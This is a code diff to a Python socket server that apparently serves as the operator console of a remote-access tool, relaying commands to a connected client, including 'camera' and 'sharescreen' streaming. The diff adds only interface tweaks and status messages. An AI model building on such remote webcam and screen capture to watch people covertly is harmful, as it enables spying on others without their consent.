@@ -27,13 +27,19 @@ Before using the server script, follow these setup instructions:
 
 4. Run the server script
 """
+__author__ = "Pangilinan, Ar Jay"
+__email__ = "jaytechph0@gmail.com"
+__status__ = "planning"
+
 import socket
 import threading
 import subprocess
 import time
+import os
 
 sock = ""
 listen = False
+connection = False
 
 host = '127.0.0.1'
 port = 22
@@ -54,20 +60,25 @@ def streama():
     
 def connect():
     try:
-        global sock
+        global sock, connection
         client_socket, client_address = server_socket.accept()
         sock = client_socket
+        os.system('cls')
+        connection = True
+        print("Connection Found...")
         print(f"Connected to {host}:{port}")
+        print("Press enter to continue...")
     except Exception as e:
         print("Error:", e)
         
 def send_data():
-    global listen
+    global listen, connection
     while True:
         try:
             data = input()
             if data.lower() == 'exit':
                 sock.send(data.encode())
+                connection = False
                 break
             
             if data.startswith("camera") or data.startswith("sharescreen"):
@@ -87,7 +98,11 @@ def send_data():
                         streamaproc.terminate()
                 else:        
                     streama()
-                
+            
+            elif data.startswith("clear"):
+                os.system('cls')
+                data = ""
+            
             elif data.startswith("back"):
                 listen = False
                 break
@@ -109,25 +124,38 @@ def receive_data():
         except Exception:
             break
 
-text = """
-Select:
+text = """Select:
 1. Connect
 2. Exit
 """      
+
 conn = threading.Thread(target=connect, daemon=True)
 conn.start()
 
 while True:
     try:
+        os.system('cls')
+        if connection:
+            print("Someone connected...")
+        else:
+            print("Waiting for connection...")
         num = int(input(text + "\n>"))
         
         if num == 1:
-            listen = True
-            receive_thread = threading.Thread(target=receive_data, daemon=True)
-            receive_thread.start()        
-            send_data()
+            if connection:
+                listen = True
+                receive_thread = threading.Thread(target=receive_data, daemon=True)
+                receive_thread.start()        
+                os.system('cls')
+                time.sleep(1)
+                send_data()
+            else:
+                os.system('cls')
+                print("No found connection. Please Enter...")
+                input()
         elif num == 2:
             listen = False
+            os.system('cls')
             break
     except Exception:
         pass
